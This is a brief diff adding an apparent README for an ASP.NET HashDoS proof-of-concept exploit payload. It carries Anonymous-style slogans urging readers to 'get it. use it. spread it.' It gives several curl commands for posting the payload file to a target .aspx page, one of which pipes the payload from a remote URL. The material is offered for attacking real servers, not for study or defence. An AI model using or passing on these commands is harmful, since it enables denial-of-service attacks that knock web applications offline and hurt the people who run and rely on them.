@@ -1,0 +1,15 @@
+
+ASP.NET HashDoS PoC/exploit payload for uc(X33X)
+
+get it. use it. spread it.
+
+We are Legion. Expect us.
+
+For aktive Testing:
+
+curl <url> | curl http://target/website.aspx -d@-
+cat PayloadFile | curl http://target/website.aspx -d@-
+or just
+curl http://target/website.aspx -d@/path/to/PayloadFile
+
+
